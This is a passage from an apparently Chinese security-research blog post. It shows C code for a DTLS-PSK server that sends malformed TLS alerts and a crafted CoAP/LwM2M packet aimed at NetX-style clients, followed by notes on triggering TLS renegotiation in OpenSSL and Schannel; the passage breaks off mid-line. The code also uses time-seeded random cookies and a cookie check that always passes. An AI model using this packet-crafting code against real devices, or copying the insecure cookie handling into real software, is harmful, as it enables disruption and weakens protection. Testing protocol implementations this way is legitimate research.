ssl_write)(ssl_st*, <span class="type">const</span> <span class="type">void</span>*, <span class="type">unsigned</span> __int64, <span class="type">unsigned</span> __int64*);</span><br><span class="line">    <span class="type">int</span>(__fastcall* ssl_shutdown)(ssl_st*);</span><br><span class="line">    <span class="type">int</span>(__fastcall* ssl_renegotiate)(ssl_st*);</span><br><span class="line">    <span class="type">int</span>(__fastcall* ssl_renegotiate_check)(ssl_st*, <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span>(__fastcall* ssl_read_bytes)(ssl_st*, <span class="type">int</span>, <span class="type">int</span>*, <span class="type">unsigned</span> __int8*, <span class="type">unsigned</span> __int64, <span class="type">int</span>, <span class="type">unsigned</span> __int64*);</span><br><span class="line">    <span class="type">int</span>(__fastcall* ssl_write_bytes)(ssl_st*, <span class="type">int</span>, <span class="type">const</span> <span class="type">void</span>*, <span class="type">unsigned</span> __int64, <span class="type">unsigned</span> __int64*);</span><br><span class="line">    <span class="type">int</span>(__fastcall* ssl_dispatch_alert)(ssl_st*);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">generate_cookie</span><span class="params">(SSL* ssl, <span class="type">unsigned</span> <span class="type">char</span>* cookie, <span class="type">unsigned</span> <span class="type">int</span>* cookie_len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Generate a cookie */</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Seed the random number generator */</span></span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Generate a random cookie */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        cookie[i] = rand() % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Print the cookie */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Cookie: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, cookie[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    *cookie_len = <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_cookie</span><span class="params">(SSL* ssl, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* cookie, <span class="type">unsigned</span> <span class="type">int</span> cookie_len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Verify the cookie */</span></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">psk_server_cb</span><span class="params">(SSL* ssl, <span class="type">const</span> <span class="type">char</span>* identity,</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">char</span>* psk, <span class="type">unsigned</span> <span class="type">int</span> max_psk_len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(identity, PSK_IDENTITY) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unknown PSK identity\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(PSK_KEY) &gt; max_psk_len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;PSK key is too long\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(psk, PSK_KEY, <span class="built_in">strlen</span>(PSK_KEY)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strlen</span>(PSK_KEY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_memory</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* mem, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* p = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)mem;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08zx  &quot;</span>, i);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; len) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, p[i + j]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; len) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(p[i + j]) ? p[i + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//void message_cb(int write_p, int version,</span></span><br><span class="line"><span class="comment">//    int content_type, const void* buf,</span></span><br><span class="line"><span class="comment">//    size_t len, SSL* ssl, void* arg) &#123;</span></span><br><span class="line"><span class="comment">//    printf(&quot;-------------dump memory------------------\n&quot;);</span></span><br><span class="line"><span class="comment">//    print_memory(buf, len);</span></span><br><span class="line"><span class="comment">//    printf(&quot;-------------dump done====================\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> g_need_change = <span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> <span class="title function_">send_callback</span><span class="params">(BIO* bio, <span class="type">int</span> cmd, <span class="type">const</span> <span class="type">char</span>* argp, <span class="type">int</span> argi,</span></span><br><span class="line"><span class="params">    <span class="type">long</span> argl, <span class="type">long</span> ret)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cmd == BIO_CB_WRITE) &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_need_change) &#123;</span><br><span class="line">            <span class="type">char</span>* data = (<span class="type">char</span>*)argp;</span><br><span class="line">            *data = <span class="number">21</span>;<span class="comment">// NX_SECURE_TLS_ALERT</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push,1)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">handle_lwm2m_protocol</span><span class="params">(SSL* ssl)</span> &#123;</span><br><span class="line">    <span class="type">char</span>* buffer = (<span class="type">char</span>*)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">char</span>* data = buffer;</span><br><span class="line">    <span class="type">int</span> data_length = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> written = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    data = buffer;</span><br><span class="line">    *(data) = <span class="number">0</span>;<span class="comment">// not NX_SECURE_TLS_ALERT_LEVEL_WARNING</span></span><br><span class="line">    *(data + <span class="number">1</span>) = <span class="number">1</span>;<span class="comment">// not NX_SECURE_TLS_ALERT_CLOSE_NOTIFY</span></span><br><span class="line">    data_length = <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">    ssl-&gt;method-&gt;ssl_write_bytes(ssl, SSL3_RT_ALERT, data, data_length, &amp;written);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//SSL_read(ssl, buffer, 0x1000);</span></span><br><span class="line">    Sleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">coap_header</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> token_length : <span class="number">4</span>;</span><br><span class="line">        <span class="type">char</span> type : <span class="number">4</span>;</span><br><span class="line">        <span class="type">char</span> code;</span><br><span class="line">        <span class="type">short</span> id;<span class="comment">// ´ó¶ËÐò</span></span><br><span class="line"></span><br><span class="line">    &#125; *header;</span><br><span class="line">    header = (<span class="keyword">struct</span> coap_header *)buffer;</span><br><span class="line">    header-&gt;type = <span class="number">4</span>;<span class="comment">// NX_LWM2M_CLIENT_COAP_VERSION_1</span></span><br><span class="line">    header-&gt;code = <span class="number">2</span>; <span class="comment">// NX_LWM2M_CLIENT_COAP_REQUEST_POST</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ±ä³¤µÄ½á¹¹Ìå coap option header</span></span><br><span class="line">    data = buffer + <span class="number">4</span>;</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">char</span>*)data = (<span class="number">11</span>&lt;&lt;<span class="number">4</span>)|(<span class="number">2</span>);<span class="comment">// 11:NX_LWM2M_CLIENT_COAP_OPTION_URI_PATH, 2 for value length</span></span><br><span class="line">    *(data + <span class="number">1</span>) = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    *(data + <span class="number">2</span>) = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">char</span>*)(data+<span class="number">3</span>) = <span class="number">0xff</span>;<span class="comment">// 0xff:NX_LWM2M_CLIENT_COAP_PAYLOAD_MARKER, for NX_LWM2M_CLIENT_COAP_OPTION_NONE;</span></span><br><span class="line">    data_length = <span class="number">4</span> + <span class="number">4</span>;</span><br><span class="line">    SSL_write(ssl, buffer, data_length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//SSL_read(ssl, buffer, 0x1000);</span></span><br><span class="line"></span><br><span class="line">    data = buffer;</span><br><span class="line">    *(data) = <span class="number">0</span>;<span class="comment">// not NX_SECURE_TLS_ALERT_LEVEL_WARNING</span></span><br><span class="line">    *(data + <span class="number">1</span>) = <span class="number">1</span>;<span class="comment">// not NX_SECURE_TLS_ALERT_CLOSE_NOTIFY</span></span><br><span class="line">    data_length = <span class="number">2</span>;</span><br><span class="line">    ssl-&gt;method-&gt;ssl_write_bytes(ssl, SSL3_RT_ALERT, data, data_length, &amp;written);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    SSL_CTX* ctx;</span><br><span class="line">    SSL* ssl;</span><br><span class="line">    BIO* bio;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize OpenSSL */</span></span><br><span class="line">    SSL_library_init();</span><br><span class="line">    SSL_load_error_strings();</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a new DTLS context */</span></span><br><span class="line">    ctx = SSL_CTX_new(DTLSv1_2_server_method());</span><br><span class="line">    <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error creating DTLS context\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set the PSK callback */</span></span><br><span class="line">    SSL_CTX_set_psk_server_callback(ctx, psk_server_cb);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//SSL_CTX_set_msg_callback(ctx, message_cb);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set the cipher list to include only PSK-AES128-CCM8 */</span></span><br><span class="line">    <span class="keyword">if</span> (SSL_CTX_set_cipher_list(ctx, <span class="string">&quot;PSK-AES128-CCM8&quot;</span>) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error setting cipher list\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a new socket */</span></span><br><span class="line">    SOCKET sock = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sock &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error creating socket\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bind the socket to the specified port */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = htons(<span class="number">5784</span>);</span><br><span class="line">    addr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    <span class="keyword">if</span> (bind(sock, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error binding socket, %d\n&quot;</span>, GetLastError());</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a new DTLS connection */</span></span><br><span class="line">    bio = BIO_new_dgram(sock, BIO_NOCLOSE);</span><br><span class="line">    <span class="keyword">if</span> (bio == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error creating DTLS connection\n&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ssl = SSL_new(ctx);</span><br><span class="line">    <span class="keyword">if</span> (ssl == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error creating DTLS connection\n&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SSL_set_bio(ssl, bio, bio);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set the DTLS cookie generation and verification callbacks */</span></span><br><span class="line">    SSL_CTX_set_cookie_generate_cb(ctx, generate_cookie);</span><br><span class="line">    SSL_CTX_set_cookie_verify_cb(ctx, verify_cookie);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//BIO_set_callback(bio, send_callback);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wait for a DTLS client to connect */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">client_addr</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Waiting for DTLS client to connect...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        ret = DTLSv1_listen(ssl, (BIO_ADDR *) &amp; client_addr);</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error: %s\n&quot;</span>, ERR_error_string(ERR_get_error(), <span class="literal">NULL</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (ret &lt;= <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Perform the DTLS handshake */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Performing DTLS handshake...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (SSL_accept(ssl) &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error performing DTLS handshake\n&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DTLS handshake complete\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Communicate with the DTLS client */</span></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    handle_lwm2m_protocol(ssl);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Clean up */</span></span><br><span class="line">    SSL_free(ssl);</span><br><span class="line">    SSL_CTX_free(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="openssl-renegotiate"><a href="#openssl-renegotiate" class="headerlink" title="openssl renegotiate"></a>openssl renegotiate</h3><p>当完成tls握手后, 如果你想触发renegotiate操作, 可以如下操作:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ret = SSL_renegotiate(ssl);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">    ret = SSL_do_handshake(ssl);<span class="comment">// 发送 hello request请求</span></span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        SSL_read(ssl, buffer, <span class="number">1024</span>);<span class="comment">// 如果目标发的消息没有处理完, 不会进行握手</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SSL_renegotiate</code> 设置重协商标志, <code>SSL_do_handshake</code> 发送加密的hello request请求. 如果client正常处理, 就应该返回一个加密的hello消息. 后续, 调用<code>SSL_read</code> 来触发新的握手协商. <strong>需要注意的时, 如果连接里有未读取的数据, 需要读到client回执的hello消息时才会触发握手操作!</strong></p><p>如果只是想简单测试, 可以用openssl程序实现, 下面的命令加载一个openssl server, 读取密钥和证书, 监听443.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; openssl.exe s_server -accept 443 -cert D:\tmp\cert.pem -key D:\tmp\key.pem</span><br><span class="line">Using default temp DH parameters</span><br><span class="line">ACCEPT</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输入<code>r</code>然后按<code>Enter</code>, 就可以让server给client发送重协商操作. </p><p>参考:</p><p><a href="https://mp.weixin.qq.com/s/-27X5ZHTeA05r2hquHjy6Q">tls重协商攻击</a></p><p><a href="https://www.linuxjournal.com/article/5487">An Introduction to OpenSSL Programming, Part II of II</a>, 这个文章很老旧了, 代码会有不对的地方.</p><h3 id="schannel-renegotiate的实现"><a href="#schannel-renegotiate的实现" class="headerlink" title="schannel renegotiate的实现"></a>schannel renegotiate的实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Renegotiation</span><span class="params">(SOCKET Server_Socket)</span> &#123;</span><br><span class="line">    TimeStamp         Lifetime;</span><br><span class="line">    SecBufferDesc     OutBuffDesc;</span><br><span class="line">    SecBuffer         OutSecBuff[<span class="number">2</span>];</span><br><span class="line">    SecBufferDesc     InBuffDesc;</span><br><span class="line">    SecBuffer         InSecBuff[<span class="number">2</span>];</span><br><span class="line">    ULONG             Attribs = <span class="number">0</span>;</span><br><span class="line">    SECURITY_STATUS           Status;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> cbIn = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    SecBufferDesc   OutBuffer;</span><br><span class="line">    SecBuffer       OutBuffers[<span class="number">1</span>];</span><br><span class="line">    DWORD           dwSSPIFlags;</span><br><span class="line">    DWORD           dwSSPIOutFlags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//DWORD dwType = SCHANNEL_RENEGOTIATE;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//OutBuffers[0].pvBuffer = &amp;dwType;</span></span><br><span class="line">    <span class="comment">//OutBuffers[0].BufferType = SECBUFFER_TOKEN;</span></span><br><span class="line">    <span class="comment">//OutBuffers[0].cbBuffer = sizeof(dwType);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//OutBuffer.cBuffers = 1;</span></span><br><span class="line">    <span class="comment">//OutBuffer.pBuffers = OutBuffers;</span></span><br><span class="line">    <span class="comment">//OutBuffer.ulVersion = SECBUFFER_VERSION;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//Status = ApplyControlToken(&amp;hctxt, &amp;OutBuffer);</span></span><br><span class="line">    <span class="comment">//if (FAILED(Status)) &#123;</span></span><br><span class="line">    <span class="comment">//    SetLastError(Status);</span></span><br><span class="line">    <span class="comment">//    LogError(&quot;fail to get controll data&quot;);</span></span><br><span class="line">    <span class="comment">//    return 0;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">    dwSSPIFlags = ASC_REQ_SEQUENCE_DETECT |</span><br><span class="line">        ASC_REQ_REPLAY_DETECT |</span><br><span class="line">        ASC_REQ_CONFIDENTIALITY |</span><br><span class="line">        ASC_REQ_EXTENDED_ERROR |</span><br><span class="line">        ASC_REQ_ALLOCATE_MEMORY |</span><br><span class="line">        ASC_REQ_STREAM;</span><br><span class="line"></span><br><span class="line">    InSecBuff[<span class="number">0</span>].BufferType = SECBUFFER_EMPTY;</span><br><span class="line">    InSecBuff[<span class="number">0</span>].pvBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    InSecBuff[<span class="number">0</span>].cbBuffer = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    InBuffDesc.ulVersion = SECBUFFER_VERSION;</span><br><span class="line">    InBuffDesc.cBuffers = <span class="number">1</span>;</span><br><span class="line">    InBuffDesc.pBuffers = InSecBuff;</span><br><span class="line"></span><br><span class="line">    OutBuffers[<span class="number">0</span>].BufferType = SECBUFFER_TOKEN;</span><br><span class="line">    OutBuffers[<span class="number">0</span>].pvBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    OutBuffers[<span class="number">0</span>].cbBuffer = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    OutBuffer.ulVersion = SECBUFFER_VERSION;</span><br><span class="line">    OutBuffer.cBuffers = <span class="number">1</span>;</span><br><span class="line">    OutBuffer.pBuffers = OutBuffers;</span><br><span class="line"></span><br><span class="line">    Status = AcceptSecurityContext(</span><br><span class="line">        &amp;hcred,</span><br><span class="line">        &amp;hctxt,</span><br><span class="line">        &amp;InBuffDesc,</span><br><span class="line">        dwSSPIFlags,</span><br><span class="line">        SECURITY_NATIVE_DREP,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;OutBuffer,</span><br><span class="line">        &amp;dwSSPIOutFlags,</span><br><span class="line">        &amp;Lifetime);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(Status)) &#123;</span><br><span class="line">        SetLastError(Status);</span><br><span class="line">        LogError(<span class="string">&quot;fail to get hello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 发送hello request 给client, client解密后会是SEC_I_RENEGOTIATE, 会调用InitializeSecurityContext, 然后发送消息过来</span></span><br><span class="line">    <span class="keyword">if</span> (!SendBytes(</span><br><span class="line">        Server_Socket,</span><br><span class="line">        (BYTE*)(OutBuffers[<span class="number">0</span>].pvBuffer),</span><br><span class="line">        OutBuffers[<span class="number">0</span>].cbBuffer))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send message failed. \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ReceiveMsg(<span class="comment">// 